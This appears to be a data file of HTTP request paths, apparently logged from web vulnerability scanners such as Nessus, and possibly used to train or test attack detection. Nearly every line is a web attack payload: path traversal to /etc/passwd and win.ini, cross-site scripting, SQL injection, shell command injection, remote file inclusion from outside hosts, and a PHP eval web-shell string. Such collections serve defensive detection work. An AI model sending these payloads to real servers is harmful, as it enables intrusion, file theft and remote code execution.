+/main.php?stuff=ping;-w;7000;-n;1;1.2.3.4&rem;
+/scripts/htsearch.cgi
+/gotopage.cgi?4242+../../../../../../../../../../../../../etc/passwd
+/scriptcon/
+/m2fpztty.dll?<img src="javascript:alert(cross_site_scripting.nasl);">
+/phpmyadmin/sql.php?server=000&cfgservers[000][host]=hello&btndrop=no&goto=/etc/passwd
+/ao22ww7y.html?<meta http-equiv=set-cookie content="testqppc=8767">
+/examples/jsp/jsp2/jspx/backend/classes.php?include_path=../lib/jinzora.js\x00
+/d765w06j.do?<img src="javascript:alert(cross_site_scripting.nasl);">
+/fastscripts2/
+/j4drbkil.exe?<img src="javascript:alert(cross_site_scripting.nasl);">
+/ikonboard.cgi?act=st&f=1&t=1&hl=nessus&st='
+/admin/htmlarea/popups/file/files.php?q=<script>alert('wvs-xss-magic-string-414355592517')</script>&mode=apparel
+/bl8sefdm.cgi?<script>cross_site_scripting.nasl</script>
+/javascript/mlist.exe
+/scripts/samples/search/filetime.idq
+/hjdzm96v.dll?<script>document.cookie="testbyqe=7474;"</script>
+/javascript/index1.exe
+/javascript/low.exe
+/lsoix5h3.cfm?<img src="javascript:alert(cross_site_scripting.nasl);">
+/jackrabbit/search.jsp?q=%"<script>alert(1332008604)</script>
+/help.php?q="&del,q66241785&rem,
+/8t9v8k7x.php?<meta http-equiv=set-cookie content="testhvje=9403">
+/scripts/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331923197',null,null,null,null --
+/cgi-sys/msmmask.exe?mask=/junk334
+/fpnpp5zg.fts?<script>document.cookie="testyias=101;"</script>
+/phpmyadmin/index2.cgi?frames=yes&board=demo&mode=current&threads=collapse&message=../../../../../../../../../../etc/passwd\x00
+/9o6g5vkn.exe?<img src="javascript:alert(cross_site_scripting.nasl);">
+/y8pmygrp.cgi?<img src="javascript:alert(cross_site_scripting.nasl);">
+/<script>document.cookie="testtkio=5454;"</script>
+/javascript/fuckoff.exe
+/opensiteadmin/scripts/classes/formmanager.php?path=http://192.168.202.96:8080/vir0v3xfc?\x00
+/g8nu2yy7.dll?<script>cross_site_scripting.nasl</script>
+/javascript/sws.exe
+/javascript/console.exe
+/nyvbv05h.mscgi?<script>document.cookie="testftxz=5980;"</script>
+/quickstore.cgi?nessus&template=../../../../../../../../../../etc/passwd\x00html
+/javascript/updater.exe
+/examples/jsp/num/include/monitoring/engine/makexml.php?fileoreonconf=/etc/passwd\x00
+/scp.dll/sendto?template=../../../../../../../../../../../../boot.ini\x00gwextranet_template_dir_traversal.nasl
+/manager/wordtrans.php?command=show_desc&advanced=1";id; true "
+/flash-xss/
+/scripts/index.php?board=nonexistant1452986522
+/8x6w469u.asp?<script>document.cookie="testgfjr=1286;"</script>
+/examples/jsp/jsp2/el/al_initialize.php?alpath=/etc/passwd\x00
+/l13b77e5.kspx?<meta http-equiv=set-cookie content="testjvvf=7721">
+/help.php?q="rm q63986192&rem 
+/script/_conf/core/common-tpl-vars.php?confdir=@rfiurl?confdir=@rfiurl?
+/phpmyadmin/index.php?gadget=glossary&action=view&term=<script>alert('jaws_xss.nasl');</script>
+/main.php?logout="del\x0cq94269861&rem\x0c
+/cacti/texis.exe/nessus
+/javascript/.htpasswd.sfish/-2147483649
+/databasesubscriptionsthumb/
+/javascript/hour.exe
+/cgibin/fileseek.cgi?foot=&head=;cat /etc/passwd|
+/albums/userpics/copperminer.jpg.php?cat /etc/passwd
+/en-us/account/include/theme.inc.php?fullpath=/etc/passwd\x00
+/ju0u7kfo.html?<img src="javascript:alert(cross_site_scripting.nasl);">
+/cgi-sys/fileseek2.cgi?foot=&head=;cat /etc/passwd|
+/javascript/broker.exe
+/examples/jsp/num/coin_includes/constants.php?_ccfg[_pkg_path_incl]=/etc/passwd\x00
+/examples/jsp/jsp2/el/admin.php?style=../../../../../../../../../../../../etc/passwd\x00
+/examples/jsp/jsp2/jspx/home?dir=/&file=../../../../../../../../../../../../etc/passwd&lang=kor
+/x7pclv4s.nsf?<meta http-equiv=set-cookie content="testiulz=3709">
+/main.php?logout='\x0dsleep\x0910\x09#
+/cabela's african safari/
+/examples/servlets/servlet/auktion.cgi?menue=../../../../../../../../../etc/passwd
+/scripts/upgrade/index.php?steporder[]=../../../../../../../../../../../../etc/passwd\x00
+/nmw0do67.php3?<script>cross_site_scripting.nasl</script>
+/scripts/d3z7yywpyeoa.asp
+/kernel/loadkernel.php?installpath=/etc/passwd\x00
+/v3axg1p8.jspa?<script>document.cookie="testxagh=6987;"</script>
+/mod_membre/inscription.php?chemin=http://192.168.202.118:8080/moclyxlwqyfjnp??
+/5qnlm5z2.aspx?<meta http-equiv=set-cookie content="testsixi=8451">
+/en-us/w4996nr0.mscgi?<script>document.cookie="testttvs=7163;"</script>
+/examples/jsp/checkbox/forum_2.php?msg=10&return=<script>foo</script>
+/ridin'high/
+/?<script>document.cookie="testyrbs=2855;"</script>
+/examples/jsp/checkbox/core/editor.php?editor_insert_bottom=/etc/passwd
+/help.php?q="&ping\xa0-w\xa08000\xa0-n\xa01\xa04.3.2.1&rem\xa0
+/help.php?q="|ping\x09-w\x0910000\x09-n\x091\x091.2.3.4|rem\x09
+/search.cgi?qt="<script>alert(412325577727)</script>&search.x=0&search.y=0
+/cgi-local/windmail.exe? -n c:\boot.ini hacker@hax0r.com | dir c:\\
+/main.php?stuff="ping\x0b-w\x0b9000\x0b-n\x0b1\x0b1.2.3.4&rem\x0b
+/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1332009302&lang_crm=../../vtigerservice.php\x00
+/javascript/.htaccess.sfish/\'\"
+/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331904405')</script>
+/o35zot2r.kspx?<img src="javascript:alert(cross_site_scripting.nasl);">
+/mod_membre/inscription.php?chemin=http://cirt.net/rfiinc.txt??
+/i2n4v4rl.cfc?<img src="javascript:alert(cross_site_scripting.nasl);">
+/examples/servlets/servlet/index.php?include_files[]=&include_files[query_string]=/etc/passwd
+/main.php?stuff="rm\x09q12267523&rem\x09
+/examples/jsp/error/news.php?prevnext=1'phpnews_prevnext_sql_injection.nasl
+/fc9t54l7.cfm?<script>document.cookie="testggad=2000;"</script>
+/cacti/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331909220&lang_crm=../../../../../../../../../../../..//etc/passwd\x00
+/cgi-bin/index2.php?_server[]=&_server[remote_addr]='.system('id').exit().'&option=wrapper&module[module]=1
+/msvcrt.exe/
+/scripts/nffhikq061nq.asp
+/miz4r5hz.cfc?<meta http-equiv=set-cookie content="testviqu=1270">
+/tamambolo_scriptprocdump/
+/main.php?frm_daynight=day&frm_passwd=&frm_referer=http%3a//192.168.23.202/top.php%3fstuff%3d2040844887&frm_user=q23487867&scr_height=&scr_width=
+/igtf0zon.fts?<script>cross_site_scripting.nasl</script>
+/ybz5rz7a.x?<meta http-equiv=set-cookie content="testsbvw=6289">
+/javascript/certified.exe
+/examples/servlets/servlet/user.cgi?url="><script>alert("gossamer_links_url_xss.nasl");</script>&from=add
+/scripts/index.php?page=/etc/passwd\x00
+/33y9gcqq.htm?<meta http-equiv=set-cookie content="testnvxc=4301">
+/opensiteadmin/scripts/classes/formmanager.php?path=http://192.168.202.96:8080/no4ghqiguzhst?\x00
+/scripting guide/
+/phpmyadmin/search=<script>alert('xss')</script>
+/subscriptions.jsf
+/miz4r5hz.x?<script>document.cookie="testviqu=1270;"</script>
+/jdx255ea.jspa?<meta http-equiv=set-cookie content="testziyq=5055">
+/main.php?logout=1:"ls"
+/q703m78q.asp?<meta http-equiv=set-cookie content="testvowq=604">
+/cgi-perl/fileseek.cgi?foot=&head=....//....//....//....//....//....//....//etc/passwd
+/scs86g1p.pl?<script>document.cookie="testquyx=2820;"</script>
+/u95h6ymu.pl?<meta http-equiv=set-cookie content="testkhwc=4028">
+/javascript/cgi-shl.exe
+/top.php?stuff='&uname\x09>q47253924\x09#
+/3j8echh0.cfc?<script>document.cookie="testfuqi=4189;"</script>
+/javascript/exec.exe
+/javascript/htpasswd.png
+/j734qobz.html?<img src="javascript:alert(cross_site_scripting.nasl);">
+/o1zj4u9v.pl?<meta http-equiv=set-cookie content="testabrn=6368">
+/cacti/k/home?dir=/&file=../../../../../../../../../../../../etc/passwd&lang=kor
+/0u75ldxq.idc?<img src="javascript:alert(cross_site_scripting.nasl);">
+/examples/jsp/jsp2/jspx/file.cgi?name=/eventcache/../../../../../../../../../../../boot.ini
+/1qwv2p5p.kspx?<script>document.cookie="testvqcy=252;"</script>
+/manager/admin/components/com_fm/fm.install.php?lm_absolute_path=../../../&install_dir=limbo_com_fm_php_shell.nasl-1331904435
+/rpxyx07v.idc?<script>document.cookie="testbnli=1975;"</script>
+/cgi-bin/index.php?template=../../../loudblog/custom/config.php\x00
+/j2kdmfw4.mscgi?<script>cross_site_scripting.nasl</script>
+/help.php?q=;rm q13157688 #
+/main.php?stuff="ping,-w,7000,-n,1,4.3.2.1&rem,
+/0qhcnefz.fts?<script>cross_site_scripting.nasl</script>
+/cgi-bin/viewcvs.cgi/?cvsroot=<script>foo</script>
+/scripts/index.php?album=../../../../../../../../../../boot.ini\x00
+/h4bi26jd.exe?<script>document.cookie="testhrzx=1150;"</script>
+/0w155a7c.php?<script>cross_site_scripting.nasl</script>
+/main.php?stuff="&del,q13326619&rem,
+/fcgi-bin/r.cgi?file=../../../../../../../../../../etc/passwd
+//..\..\..\..\..\..\..\..\windows/win.ini
+/scriptguide/
+/javascript/document.temp
+/top.php?stuff='uname\x09>q54162214\x09#
+/javascript/big.exe
+/d765w06j.do?<script>cross_site_scripting.nasl</script>
+/script/ident/loginmodif.php?path_inc=http://192.168.202.118:8080/moclyxlwqyfjnp?
+/manager/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904457','5'--
+/recordings/al_initialize.php?alpath=/etc/passwd\x00
+/jnv890lt.cgi?<script>cross_site_scripting.nasl</script>
+/cgi-914/texis.exe/junk
+/main.php?logout='\x0ddel q95689814 #
+/\x0a\x0a<script>alert(\"vulnerable\")</script>.jsp
+/phpmyadmin/sgdynamo.exe?htname=sgdynamo.exe
+/main.php?logout=&ver,>q27276952&rem,
+/scripts/includes/db_adodb.php?basedir=/etc/passwd\x00
+/scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331919200,0x3a,512612977),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+/script//ident/index.php?path_inc=@rfiurl
+/help.php?q="ping -w 9000 -n 1 4.3.2.1&rem 
+/help.php?q=&uname >q88293785 #
+/cgi-bin/faq.php?action=&type=view&s=&id=-1' union select 0,929714876,0,0,0,0,0--
+/top.php?stuff="\x0duname >q44371957 #
+/awstats/awstats.pl?migrate=|echo;echo x;echo|awstats340378.txt
+/en-us/9kr0ih0v.exe?<meta http-equiv=set-cookie content="testzgnm=1183">
+/javascript/htpasswd.html
+/u8yiqilu.aspx?<script>document.cookie="testswjp=6010;"</script>
+/templates/tmpl_dfl/scripts/index.php?dir[inc]=http://192.168.202.118:8080/ghl9il?
+/addvip.php?msetstr["progsdir"]=http://192.168.202.118:8080/tzhfyzkbomspvm?
+/script/plugins/phpgacl/admin/index.php?path_inc=http://192.168.202.96:8080/4dckqcc0acprbz?
+/top.php?stuff="&ver >q91375949&rem 
+/scripts/tomcat_proxy_directory_traversal.nasl1332008334
+/help.php?q="ping\x0b-w\x0b7000\x0b-n\x0b1\x0b1.2.3.4|rem\x0b
+/javascript/letters.exe
+/javascript/paid.exe
+/examples/jsp/checkbox/login.php?lang=/../../../../../../../../../../../../etc/passwd\x00.txt
+/recordings/index.php?entry='
+/vac1l5vm.do?<script>cross_site_scripting.nasl</script>
+/82q7ywa8.aspx?<script>document.cookie="testpwew=1315;"</script>
+/ff_noscript/
+/help.php?q=";del\x09q65733963\x09#
+/javascript/yearly.exe
+/javascript/opt.exe
+/examples/jsp/sessions/btdownload.php?type=torrent&file=../../../../../../../../../../etc/passwd
+/static//..\xc1\x9c..\xc1\x9c..\xc1\x9c..\xc1\x9c..\xc1\x9c..\xc1\x9c..\xc1\x9c..\xc1\x9c/windows/win.ini
+/contribute.cgi?template=/etc/passwd&contribdir=.&plugin=alkalay_cmd_exec.nasl
+/javascript/shtml.exe
+/examples/jsp/checkbox/popup.php?include_path=/etc/passwd\x00
+/33y9gcqq.fts?<script>document.cookie="testnvxc=4301;"</script>
+/javascript/makefile.exe
+/6dlc2zm9.dll?<meta http-equiv=set-cookie content="testqpux=4016">
+/examples/jsp/error/listrec.pl?app=qmh-news&template=;ls /etc|
+/scripts/printenv.pl
+/eei78ore.idc?<img src="javascript:alert(cross_site_scripting.nasl);">
+/examples/jsp/jsp2/jspx/index.php?search='><script>alert('autoindex_search_xss.nasl');</script>&searchmode=f
+/scripting tools/
+/htbin/fileseek2.cgi?foot=....//....//....//....//....//....//....//etc/passwd&head=
+/9o6g5vkn.html?<script>cross_site_scripting.nasl</script>
+/i686v90l.exe?<meta http-equiv=set-cookie content="testfutf=1550">
+/examples/jsp/num/home/search.asp?nchannel='1
+/scripts/info.dat
+/tuwjta1w.htm?<meta http-equiv=set-cookie content="testpokn=7494">
+/scripts/ohelp/en_us/content/master/webadmin/webadmin.html
+/examples/jsp/cal/check_user_id.php?user_id=<script>foo</script>
+/main.php?stuff="ver;>q74579968&rem;
+/cgi-home/htimage.exe/path/filename?2,2
+/index.php?op=default&date=200607' union select 1,1425852379,1,1,1,1,1,1,1,1--&blogid=1
+/it's_cad-tastic!/
+/javascript/htpasswd.csv
+/j4oqyvga.htm?<img src="javascript:alert(cross_site_scripting.nasl);">
+/shop/normal_html.cgi?file=|cat /etc/passwd|
+/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1332010395',null,null,null,null --
+/en-us/dda2qr7j.cfm?<script>cross_site_scripting.nasl</script>
+/hipkz026.cfm?<meta http-equiv=set-cookie content="testyrbs=2855">
+/qb2xy9aw.cfc?<script>cross_site_scripting.nasl</script>
+/moodle/filter/tex/texed.php?formdata=foo&pathname=foo"+||+echo+a+fa+>>ctdn
+/rbec2ohx.dll?<img src="javascript:alert(cross_site_scripting.nasl);">
+/subscriptions.pfx
+/en-us/fo564rei.html?<script>cross_site_scripting.nasl</script>
+/j4rdyhw8.html?<script>document.cookie="testrluj=1420;"</script>
+/bn857frh.dll?<script>cross_site_scripting.nasl</script>
+/nyjgaorz.jspa?<script>cross_site_scripting.nasl</script>
+/mod_membre/inscription.php?chemin=@rfiurl?chemin=@rfiurl?
+/conscripted_gifts/
+/cgi-win/fileseek2.cgi?foot=&head=....//....//....//....//....//....//....//etc/passwd
+/[seccheck]/..%2f..%2f../ext.ini
+/ybz5rz7a.idc?<meta http-equiv=set-cookie content="testsbvw=6289">
+/cacti/index.php?act=arcade&do=stats&gameid=1'
+/scripts/zq9frlz6fcfp.pl
+/scripts/tools/dsnform.exe
+/bxnyrhmh.cfm?<meta http-equiv=set-cookie content="testmjct=1867">
+/d7ktpmcq.mscgi?<script>cross_site_scripting.nasl</script>
+/7u1pb2xi.idc?<meta http-equiv=set-cookie content="testlwwz=718">
+/cgi-win/sensepost.exe?/c+dir
+/scripts/force-download.php
+/admin/common/script.js.php.copy
+/scripts/nckowqpd4zng.sh
+/javascript/reprints.exe
+/forum-ra.asp?n=/etc/passwd
+/javascript/track.exe
+/recordings/starnet/addons/slideshow_full.php?album_name='1334444193
+/m5103snj.idc?<script>cross_site_scripting.nasl</script>
+/examples/jsp/cal/index.php?gadget=glossary&action=viewterm&term=<script>alert('jaws_xss.nasl');</script>
+/javascript/cpadmin.exe
+/main.php?logout=';del\x09q16263765\x09#
+/scripts/include/theme.inc.php?fullpath=/etc/passwd\x00
+/phpmyadmin/documentation.html?phpmyadmin=map47fckapd3c2j9d7svslcjakhdm1fs' and sleep(4)='
+/main.php?frm_daynight=day&frm_passwd=&frm_referer=http%3a//192.168.28.202/&frm_user=&scr_height=&scr_width=q27812776
+/cgi-bin/awstatstotals.php?sort="].phpinfo().exit().$a["
+/cgi-perl/msmmask.exe?mask=/junk334
+/o35zot2r.pl?<img src="javascript:alert(cross_site_scripting.nasl);">
+ftp://192.168.23.203/*<apache_mod_proxy_ftp_glob_xss.nasl>
+/examples/jsp/error/fxm.exe
+/script/param/param.inc.php?path_inc=http://192.168.202.118:8080/tzhfyzkbomspvm?
+/en-us/<img src="javascript:alert(cross_site_scripting.nasl);">.asp
+/scripts/xaradodb/server.php?sql='adodb_sql_sql_injection.nasl
+/top.php?stuff="&del\x09q45798999&rem\x09
+/x7pclv4s.mscgi?<script>document.cookie="testiulz=3709;"</script>
+/en-us/i686v90l.x?<script>document.cookie="testfutf=1550;"</script>
+/moodle/filter/tex/texed.php?formdata=foo&pathname=foo"+||+echo+db+06+00+00+00+00+00+00+00+00+00+00+00+00+00+00+20+00+00+e0+44+41+54+41+00+00++>>esbq
+/phpmyadmin/hw3.cgi?daysonly=0).system('id').(
+/help.php?q='\x0auname >q83228487 #
+/zoomstats/libs/dbmax/mysql.php?globals['lib']['db']['path']=http://192.168.202.118:8080/tzhfyzkbomspvm??
+/l13b77e5.cfc?<script>document.cookie="testjvvf=7721;"</script>
+/javascript/oa_servlets.exe
+/tiasystemdescription/
+/zuihld5m.jsp?<img src="javascript:alert(cross_site_scripting.nasl);">
+/phpmyadmin/newsscript.pl?mode=admin
+/main.php?frm_daynight=day&frm_passwd=q75353854&frm_referer=http%3a//192.168.26.202/&frm_user=&scr_height=&scr_width=
+/cgi-bin/cgicso?query=<script>alert('vulnerable')</script>
+/ygkjkngd.cgi?<script>document.cookie="testnago=4518;"</script>
+/?"><script>alert('struts_sa_surl_xss.nasl')</script>
+/cgi-bin/apexec.pl?etype=odp&template=../../../../../../../../../etc/passwd\x00.html&passurl=/category/
+/javascript/.passwd.phtml
+/poker tournament - no limit texas hold'em/
+/scripts/sc877q2pzqne.cfm
+/recordings/sgdynamo.exe?htname=sgdynamo.exe
+/order/login.php?svr_rootscript=@rfiurl
+/en-us/33y9gcqq.mscgi?<script>document.cookie="testnvxc=4301;"</script>
+/nmw0do67.idc?<img src="javascript:alert(cross_site_scripting.nasl);">
+/scripts/www/delivery/ac.php?bannerid=-1331908787+or+1=1+--+';passthru(base64_decode($_server[http_nessus_ti5957ae]));die;/*
+/mv8wxfy9.nsf?<meta http-equiv=set-cookie content="testrhbc=8184">
+/copatranscript_20061024/
+/subscriptions.tar
+/scripts/neomail-prefs.pl?sessionid=nessus-session-0.neomail_sessionid_validation.nasl&action=addfolder&foldername=dzp1jwatlet0voxta
+/qczkquis.jsp?<script>document.cookie="testkwlg=5591;"</script>
+/examples/jsp/cal/lang/index.php?file=/etc/passwd
+/aj3pf49c.php?<meta http-equiv=set-cookie content="testnofv=4170">
+/m2fpztty.pl?<img src="javascript:alert(cross_site_scripting.nasl);">
+/hjdzm96v.cgi?<meta http-equiv=set-cookie content="testbyqe=7474">
+/zshscripts/
+/cgi/ion-p?page=../../../../../etc/passwd
+/zuihld5m.cgi?<img src="javascript:alert(cross_site_scripting.nasl);">
+/cgi-bin/smartsearch.cgi?keywords=|/bin/cat /etc/passwd|
+/xsqln7eb.jspa?<script>document.cookie="testpcbb=9254;"</script>
+/examples/jsp/error/af.cgi?_browser_out=.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./etc/passwd
+/script/fckeditor/editor/dialog/fck_flash.html
+/<?php eval($_post['q27992363']);?>
+/phpmyadmin//./../../../../../../../.windows/win.ini
+/help.php?q=ver\xa0>q95666948&rem\xa0
+/examples/jsp/error/ftp/ftp.pl?dir=../../../../../../etc
+/javascript/categories.exe
+/cgi-binfaq.php?skin=../../admin/manager&tplpath=admin
+/cgi-perl/gw5/gwweb.exe?help=bad-request
+/examples/jsp/error/activatemember?activatecode=&member="><script>alert('mvnforum_activatemember_xss.nasl')</script>
+/main.php?frm_daynight=day&frm_passwd=&frm_referer=q33487769&frm_user=&scr_height=&scr_width=
+/cgi-bin/.htpasswd
+/dslpwt15.cfm?<script>document.cookie="testtkio=5454;"</script>
+/main.php?stuff='\x0asleep\x099\x09#
+/mrtg.cgi?cfg=/../../../../../../../../../etc/passwd
+/igtf0zon.idc?<img src="javascript:alert(cross_site_scripting.nasl);">
+/pam-passwdqc/
+//<body><script/src="http://www.example.com/test?rnd=q96295372"></script>
+/scripts/app_and_readme/navigator/index.php?page=http://192.168.202.96:8080/ipb5ri?
+/javascript/access-log.1.exe
+/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1332009307,416096840 -- 
+/?<meta http-equiv=set-cookie content="testbnli=1975">
+/0qhcnefz.x?<script>cross_site_scripting.nasl</script>
+/um7xpn15.jspa?<script>document.cookie="testotoy=6142;"</script>
+/examples/jsp/cal/index.php?cat='
+/2004conferencedescription/
+/homebet/homebet.dll?form=menu&amp;option=menu-signin
+/scripts/dcforum.cgi?az=list&forum=../../../../../../../etc/passwd\x00
+/manager/forumdisplay.php?fid=21"><script>x</script>
+/cgi-914/a1stats/a1disp3.cgi?../../../../../../../../../../etc/passwd
+/popularvirusdescriptions/
+/u8yiqilu.cfc?<script>document.cookie="testswjp=6010;"</script>
+/?<meta http-equiv=set-cookie content="testgjbe=8505">
+/javascript/minute.exe
+/<img src="javascript:alert(cross_site_scripting.nasl);">
+/scripts/search.jsp?q=%"<script>alert(1331904374)</script>
+/cgi-bin/activeauctionsuperstore/iteminfo.asp?itemid=42'
+/opensearchdescription/
+ftp://192.168.27.253/*<apache_mod_proxy_ftp_glob_xss.nasl>
+/main.php?stuff="&del;q22147997&rem;
+/top.php?stuff="ver,>q37582953&rem,
+/awstats/awstats.pl?migrate=|echo;chmod 777 /tmp/jbqahurnly.sh;echo|awstats912357.txt
+/6dlc2zm9.cfc?<script>document.cookie="testqpux=4016;"</script>
+/qczkquis.cfm?<script>document.cookie="testkwlg=5591;"</script>
+/top.php?stuff="&del\x09q22847462\x09#
+/gvx7m5ti.php?<meta http-equiv=set-cookie content="testwldz=3506">
+/cgi-914/fileseek2.cgi?foot=;cat /etc/passwd&head=
+/help.php?q=";del q49727674 #
+/phpmyadmin//\..\..\..\..\..\..\..\..\windows/win.ini
+/javascript/promoted.exe
+/scripts/hosting/addsubsite.asp
+/j734qobz.do?<img src="javascript:alert(cross_site_scripting.nasl);">
+<meta http-equiv=set-cookie content="testhvje=9403">
+/azcrfs8d.htm?<meta http-equiv=set-cookie content="testjpdr=9205">
+/examples/jsp/cal/mlog.html?screen=/etc/passwd
+/en-us/9kr0ih0v.idc?<script>document.cookie="testzgnm=1183;"</script>
+/rpxyx07v.cfc?<meta http-equiv=set-cookie content="testbnli=1975">
+/help.php?q="&rm,q81149724&rem,
+/examples/servlets/servletsearch_results.dot?search_query=nessus"><script>alert('dotcms_search_query_xss.nasl')</script>/
+/0u75ldxq.kspx?<img src="javascript:alert(cross_site_scripting.nasl);">
+/scripts/netpad.cgi
+/top.php?stuff="\x0drm q44371957 #
+/zroo33l4.jsp?<script>document.cookie="testiklc=904;"</script>
+/javascript/find.exe
+/j4rdyhw8.asp?<script>document.cookie="testrluj=1420;"</script>
+/zuihld5m.pl?<img src="javascript:alert(cross_site_scripting.nasl);">
+/manager/inc/exif.inc.php?exif_prog=(echo -n 'original_exif_prog_cmd_exec.nasl: ';id)||echo
+/fmnveedu.mscgi?<meta http-equiv=set-cookie content="testgfbr=7014">
+/javascript/tape.exe
+/top.php?stuff="|ping\x09-w\x098000\x09-n\x091\x094.3.2.1|rem\x09
+/examples/jsp/sessions/dsweb/services/user-1"><body onload=alert('xerox_docushare_dsweb_xss.nasl')>
+<meta http-equiv=set-cookie content="testmjct=1867">
+/javascript/backups.exe
+/edition"/
+/..\xc1\x9c..\xc1\x9c..\xc1\x9c..\xc1\x9c..\xc1\x9c../winnt/system32/cmd.exe?/c+dir+c:\+/og
+/e9rx3ya4.asp?<img src="javascript:alert(cross_site_scripting.nasl);">
+/manager/apexec.pl?etype=odp&template=../../../../../../../../../etc/passwd\x00.html&passurl=/category/
+/169okeyj.cfc?<meta http-equiv=set-cookie content="testxeoi=3573">
+/fnwhrxyd.kspx?<script>cross_site_scripting.nasl</script>
+/scripts/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331904405')</script>
+//%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc/passwd
+/forum_arc.asp?n=`/etc/passwd`|36|80040e14|[microsoft][odbc_sql_server_driver][sql_server]line_1:_incorrect_syntax_near_&#039;`&#039;.
+/phpmyadmin/language.php?data_dir=/etc/passwd\x00
+/snowboardingxssmallicon/
+/showmail.pl?folder=<script>alert(document.cookie)</script>
+/aixssh/
+/html/partner.php?mainfile=anything&default_theme='<script>alert(document.cookie);</script>
+/subscriptions.dump
+/cgi-win/ustorekeeper.pl?command=goto&file=../../../../../../../../../../etc/passwd
+/0w155a7c.pl?<img src="javascript:alert(cross_site_scripting.nasl);">
+/book review - how to say it when you don't know what to say/
+/cgi-bin/simple/view_page?mv_arg=|cat /etc/passwd|
+/scripts/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1332010390&lang_crm=../../../../../../../../../../../..//etc/passwd\x00
+/?<script>document.cookie="testvowq=604;"</script>
+/fc9t54l7.x?<script>document.cookie="testggad=2000;"</script>
+/jnv890lt.htm?<script>cross_site_scripting.nasl</script>
+/en-us/account/search.jsp?q=%"<script>alert(1331905049)</script>
+/scripts/wd7crx47eaml.shtml
+/transcript_tomwelsh050429/
+/main.php?stuff="ping,-w,9000,-n,1,4.3.2.1|rem,
+/miz4r5hz.fts?<script>document.cookie="testviqu=1270;"</script>
+/scripts/rvckwz6smkqf.pl
+/uc3w3bdi.x?<script>document.cookie="testxllt=9940;"</script>
+/javascript/mobile.exe
+/scripts/nmap.php?target=|id
+/help.php?q="ver\x0b>q76374652&rem\x0b
+/examples/jsp/checkbox/includes/converter.inc.php?include_path=/etc/passwd\x00
+/gvx7m5ti.asp?<script>document.cookie="testwldz=3506;"</script>
+/en-us/i686v90l.asp?<script>document.cookie="testfutf=1550;"</script>
+/en-us/account/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331905034&lang_crm=../../vtigerservice.php\x00
+/javascript/7.exe
+/xsqln7eb.php?<meta http-equiv=set-cookie content="testpcbb=9254">
+/h5sc3gxy.cfc?<img src="javascript:alert(cross_site_scripting.nasl);">
+/gpasswd/
+/webscripts/
+/d5a5renl.jsp?<img src="javascript:alert(cross_site_scripting.nasl);">
+/examples/jsp/cal/includes/config.php?relative_script_path=http://xxxxxxx
+/scripts/vzdybnanqpc3.cgi
+/s7qus4g3.pl?<img src="javascript:alert(cross_site_scripting.nasl);">
+/examples/jsp/jsp2/jspx/index.php?chemin=../../../../../../..//etc
+..\\..\\..\\..\\..\\..\\windows\\win.ini
+/javascript/.passwd.exe
+/scripts/prnnucptkixl.inc
+/javascript/jdbc.exe
+/examples/jsp/cal/pjreview_neo.cgi?p=../../../../../../../../../../etc/passwd
+/cgi-win/fileseek2.cgi?foot=&head=;cat /etc/passwd|
+/calendar_admin.pl?config=|cat /etc/passwd|
+/3j8echh0.jspa?<script>document.cookie="testfuqi=4189;"</script>
+/examples/jsp/error/workarea/contentdesigner/ekformsiframe.aspx?id="><script>alert('nessus')</script>
+/jnt3f86c.jspa?<script>document.cookie="testcmax=9270;"</script>
+/top.php?stuff="&ver\x0c>q74447142&rem\x0c
+/examples/servlets/servlet/logbook.pl?file=../../../../../../../../../../bin/cat /etc/passwd\x00|
+/pam-passwdqc_0/
+/uc3w3bdi.cfm?<meta http-equiv=set-cookie content="testxllt=9940">
+/j4oqyvga.jsp?<script>cross_site_scripting.nasl</script>
+/zabbix/frontends/php/locales.php?download=1&langto=1&extlang[".system('/./tmp/mwukuzjaqe.sh+>+/dev/null+&')."]=1
+/mrating.exe/
+/scripta/
+/javascript/import.exe
+/scripts/index.php?board=nonexistant522491339
+/iv5vkgam.mscgi?<script>document.cookie="testfosd=94;"</script>
+/help.php?q="rm,q11574297&rem,
+/scripts/about.php
+/esmozg5d.dll?<script>cross_site_scripting.nasl</script>
+/javascript/footer.exe
+/examples/jsp/colors/index.php?name=your account&profile=anyone"><script>alert('nessus was here');</script>
+/forum-ra_professionnel.asp?n=../../boot.ini
+/main.php?stuff="\x0drm\x09q16681283\x09#
+//.../.../.../.../.../.../.../.../etc/passwd
+/search.asp?term=<\x00script>alert('vulnerable')</script>
+/cgi-bin/index.php?string='
+/en-us/jnv890lt.asp?<script>cross_site_scripting.nasl</script>
+/dir_thatware/config.php?root_path=http://192.168.202.96:8080/txenjrxf3?'
+/javascript/redir.exe
+/downloads/pafiledb.php?action=email&id=4?\"&lt;script&gt;alert('vulnerable')&lt;/script&gt;\"
+/en-us/i686v90l.cfc?<script>document.cookie="testfutf=1550;"</script>
+/admin/doeditconfig.php?thispath=../includes&config[path]=http://192.168.202.118:8080/tzhfyzkbomspvm?
+/main.php?logout="ping\x09-w\x0910000\x09-n\x091\x091.2.3.4|rem\x09
+/x2gyorli.htm?<meta http-equiv=set-cookie content="testwhac=3130">
+/vjbrrppi.html?<script>cross_site_scripting.nasl</script>
+/oldscripts/
+/cgi-bin/admin/components/com_fm/fm.install.php?lm_absolute_path=../../../&install_dir=limbo_com_fm_php_shell.nasl-1332010411
+/scripts/content.php?get_action=display_doc&doc_file=credits
+/j4oqyvga.htm?<script>cross_site_scripting.nasl</script>
+/scripts/calendar.php?month=' union select 1,1,'1331904667','calendarix_month_sql_injection.nasl',1 #
+/scripts/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1332008334','5'--
